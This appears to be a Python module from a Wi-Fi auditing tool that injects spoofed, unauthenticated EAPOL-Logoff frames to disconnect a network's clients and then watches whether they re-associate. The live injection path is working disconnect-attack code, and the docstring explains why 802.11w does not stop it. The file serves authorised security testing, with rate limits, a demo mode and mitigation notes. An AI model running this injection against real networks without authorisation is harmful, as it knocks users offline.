# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""EAPOL-Logoff: the disconnect nobody authenticates.

802.1X has no way to authenticate a Logoff.  The frame is three bytes and a length
field — version, type, length — and a supplicant that receives one is supposed to
tear down its port.  Every other way of disconnecting a client has a mitigation:
deauthentication is what 802.11w protects, disassociation the same, and an association
table flood at least shows up as "the AP is misbehaving".  An EAPOL-Logoff has none,
because it is not a management frame at all — PMF does not cover it, and a site that
deployed 802.11w believing that solved "clients can be disconnected" has a gap.

wifipilot builds those frames itself (:mod:`wifipilot.rawtx`) and sends a handful per
client, which is enough to answer the question: *does this client stop when it gets an
unauthenticated Logoff from the AP it is talking to?*  The finding is reported for what
it is — a client-side behaviour, with the caveat that some supplicants are configured
to ignore Logoff, and that a Logoff is a disconnect, not a deauth-based handshake
opportunity (it never generates a 4-way handshake, so it is not a capture technique).

The attack injects, so it is gated by the authorisation prompt, and it sends a bounded
number of frames: one burst per client, both the plain and the QoS shape, no repeats.
"""

from __future__ import annotations

import time
from typing import List

from ..models import STATUS_SUCCESS, AccessPoint, Attempt, Finding
from ..rawtx import (RawInjector, build_eapol_logoff, build_qos_eapol,
                     describe, injection_available)
from .base import Attack, AttackContext, AttackOutcome


class EapolLogoffAttack(Attack):
    """Disconnect clients with an unauthenticated EAPOL-Logoff frame."""

    name = "eapol_logoff"
    label = "EAPOL-Logoff (unauthenticated disconnect)"
    tool = "wifipilot rawtx.py (AF_PACKET injection)"
    description = ("Send an EAPOL-Logoff from the AP's address to each client: the "
                   "frame needs no authentication, so 802.11w does not stop it.  The "
                   "finding is whether stations accept it — a disconnect technique "
                   "with no mitigation beyond client configuration.")
    requires = ("monitor",)
    needs_injection = True
    applies_to = ("WPA", "WPA2", "WPA2/WPA3", "WPA3", "WEP", "OPEN", "OWE",
                  "WPA-ENTERPRISE", "WPA2-ENTERPRISE", "ENTERPRISE")

    #: how many frames per client (plain + QoS shape, one round)
    frames_per_client = 3
    #: never more than this many clients per attempt, however big the AP is
    max_clients = 6

    def applies(self, ap: AccessPoint) -> bool:
        # a Logoff is addressed to a station, so there has to be one
        return bool(ap.clients)

    def available(self, ctx: AttackContext) -> bool:
        if ctx.demo:
            return True
        # the frame is built here, so no external tool is needed — but the kernel
        # socket does need root and a monitor interface
        return bool(ctx.monitor) and injection_available(ctx.monitor)

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return (f"raw injection needs root/CAP_NET_RAW and a monitor interface "
                f"({ctx.monitor or 'none'}): the EAPOL-Logoff frame is built "
                f"in-process, so aireplay-ng cannot send it for us")

    # ---------------------------------------------------------------- #
    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool,
            chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        clients = [client.mac for client in
                   sorted(ap.clients.values(), key=lambda c: c.signal, reverse=True)
                   if client.mac][:self.max_clients]
        if not clients:
            ctx.session.end_attempt(attempt, "skipped", "no clients on this AP",
                                    "a Logoff is addressed to a station")
            return AttackOutcome.skipped("no clients on this AP",
                                         "nothing to disconnect")
        ctx.bus.log(f"EAPOL-Logoff to {len(clients)} client(s) of {ap.display_name}: "
                    f"an unauthenticated disconnect (802.11w does not cover it)",
                    level="warning")
        if ctx.demo:
            return self._demo(ctx, ap, attempt, clients)
        return self._live(ctx, ap, attempt, clients)

    # ---------------------------------------------------------------- #
    def _finish(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                clients: List[str], sent: int, reassociated: List[str],
                simulated: bool, note: str = "") -> AttackOutcome:
        if not sent:
            return self._fail(ctx, attempt, "no frames were transmitted",
                              note or "the injection socket never opened")
        detail = (f"{sent} EAPOL-Logoff frame(s) sent to {len(clients)} client(s); "
                  f"{len(reassociated)} re-associated afterwards"
                  + (f" ({', '.join(reassociated[:3])})" if reassociated else "")
                  + (" (simulated)" if simulated else ""))
        if reassociated:
            severity = "high"
            title = "Clients accept an unauthenticated EAPOL-Logoff"
            body = (f"{len(reassociated)} station(s) re-appeared as a fresh association "
                    f"within the observation window of an unauthenticated Logoff frame "
                    f"sent from the AP's address.  A station that simply roamed looks "
                    f"the same, so this is evidence rather than proof — but it is the "
                    f"only signal a monitor sees for a Logoff, because EAPOL is not a "
                    f"management frame and 802.11w (PMF) does not cover it.  A site "
                    f"relying on PMF to prevent client disconnects still has this gap; "
                    f"the mitigation is supplicant-side (ignore Logoff) or a WPA3-only "
                    f"deployment.")
        else:
            severity = "medium"
            title = "EAPOL-Logoff delivered (no observable response)"
            body = (f"{sent} Logoff frame(s) were transmitted to {len(clients)} "
                    f"client(s) with no association re-appearing in the window: the "
                    f"stations may ignore Logoff, or they reconnected quietly.  "
                    f"Reported as delivered, not as effective.")
        if note:
            body += f"  {note}"
        if simulated:
            body += "  (Simulated: the drop is modelled, not measured.)"
        ctx.session.add_finding(Finding(kind=self.name, severity=severity,
                                        bssid=ap.bssid, title=title, detail=body))
        ap.remember("eapol_logoff", detail, clients=clients[:6])
        ctx.session.stats.logoffs += 1
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, title, detail)
        return AttackOutcome.success(
            title, detail=detail,
            extra={"clients": clients, "frames": sent, "reassociated": reassociated,
                   "simulated": simulated,
                   "note": ("a Logoff disconnects; it never produces a 4-way "
                            "handshake, so it is not a capture technique")})

    def _demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
              clients: List[str]) -> AttackOutcome:
        """Model both outcomes: most supplicants drop, a modern one ignores the frame.

        A WPA3-only network in the simulation stands in for "client configured to
        ignore Logoff", which is the real-world mitigation — so the demo produces
        the medium finding there and the high finding everywhere else.  That keeps
        the attack's honest branch (delivered, no response) exercised by the tests.
        """
        radio = ctx.radio
        demo_ap = radio.find(ap.bssid) if radio else None
        modern = bool(demo_ap is not None and demo_ap.auth == "SAE"
                      and demo_ap.encryption == "WPA3")
        frames = self.frames_per_client * len(clients)
        reassociated: List[str] = []
        for index, client in enumerate(clients):
            ctx.progress(f"EAPOL-Logoff to {ap.display_name}", kind="capture",
                         bssid=ap.bssid,
                         percent=min(95, (index + 1) / max(1, len(clients)) * 100),
                         detail=f"{len(reassociated)} client(s) re-associated (simulated)")
            time.sleep(0.25)
            if ctx.want_stop():
                break
            if not modern:
                reassociated.append(client)
        return self._finish(ctx, ap, attempt, clients, frames, reassociated, True)

    def _live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
              clients: List[str]) -> AttackOutcome:
        interface = ctx.config.twin_interface or ctx.monitor
        if not injection_available(interface):
            return self._fail(
                ctx, attempt, "raw injection unavailable",
                f"cannot open AF_PACKET on {interface}: need root/CAP_NET_RAW and a "
                f"monitor interface (`iw dev {interface} set type monitor`)")
        ctx.set_channel(ap.channel)
        sent = 0
        started = time.time()
        with RawInjector(interface, rate_limit=0.05) as injector:
            if not injector.open():
                return self._fail(ctx, attempt, "injection socket failed",
                                  injector.result.error)
            for index, client in enumerate(clients):
                frames = self._frames(ap.bssid, client)
                result = injector.send(frames)
                sent += result.sent
                if not result.sent and result.error:
                    break
                ctx.progress(f"EAPOL-Logoff to {ap.display_name}", kind="capture",
                             bssid=ap.bssid,
                             percent=min(95, (index + 1) / len(clients) * 100),
                             detail=f"{sent} frame(s) sent")
        # a Logoff is not visible as a frame we can count, so the signal we have is the
        # client coming back: poll for a fresh association for a few seconds after the
        # burst instead of asking once and concluding that nothing happened.  A station
        # that roamed looks the same as one that obeyed, which is why the finding is
        # worded as evidence rather than proof.
        window = min(8.0, max(4.0, ctx.config.attack_timeout_for(self.name)))
        deadline = started + window
        reassociated: List[str] = []
        while time.time() < deadline and not ctx.want_stop():
            reassociated = self._observe_reassociation(ap, clients, started)
            if len(reassociated) >= len(clients):
                break
            ctx.progress(f"watching for {len(clients)} client(s) to re-associate",
                         kind="capture", bssid=ap.bssid,
                         percent=min(95, (time.time() - started) / window * 100),
                         detail=f"{len(reassociated)} re-associated so far")
            time.sleep(0.5)
        return self._finish(ctx, ap, attempt, clients, sent, reassociated, False)

    def _frames(self, bssid: str, client: str) -> List[bytes]:
        """The burst for one client: plain and QoS shapes, capped at the limit."""
        frames = [build_eapol_logoff(bssid, client), build_qos_eapol(bssid, client)]
        while len(frames) < self.frames_per_client:
            frames.append(build_eapol_logoff(bssid, client))
        return frames[:max(2, self.frames_per_client)]

    @staticmethod
    def _observe_reassociation(ap: AccessPoint, clients: List[str],
                               since: float) -> List[str]:
        """Clients whose association is newer than the burst (evidence, not proof)."""
        return [client.mac for client in ap.clients.values()
                if client.mac in clients and client.first_seen >= since]


def logoff_preview(bssid: str, client: str, frames: int = 3) -> List[str]:
    """Human-readable description of the frames a Logoff attempt would send."""
    built = [build_eapol_logoff(bssid, client), build_qos_eapol(bssid, client)]
    while len(built) < max(2, frames):
        built.append(build_eapol_logoff(bssid, client))
    return [f"{kind} frame, {length} bytes" for kind, length in describe(built[:frames])]
